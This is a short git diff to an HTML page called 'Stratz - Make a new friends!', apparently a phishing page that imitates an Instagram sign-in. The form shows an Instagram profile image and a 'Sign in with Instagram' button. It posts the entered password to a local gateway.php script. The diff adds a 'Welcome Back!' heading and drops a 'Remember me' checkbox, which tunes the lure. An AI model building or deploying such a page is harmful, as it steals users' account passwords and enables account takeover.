@@ -17,17 +17,13 @@
         <title>Stratz - Make a new friends!</title>
         
     <div class="container">
-
+      <h5>Welcome Back!</h5>
       <form class="form-signin" method="POST" action="gateway.php">
         <img src="https://scontent-frt3-1.cdninstagram.com/t51.2885-19/s150x150/19429483_143315616232889_3294209164066160640_a.jpg" class="rounded mx-auto d-block">
         <center><i>@Username</i></center>
         <label for="inputPassword" class="sr-only">Password</label>
         <input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
-        <div class="checkbox">
-          <label>
-            <input type="checkbox" value="remember-me"> Remember me
-          </label>
-        </div>
+
         <button class="btn btn-medium btn-primary btn-block" type="submit"><span class="fa fa-instagram" aria-hidden="true"></span> Sign in with Instagram</button>
       </form>
 
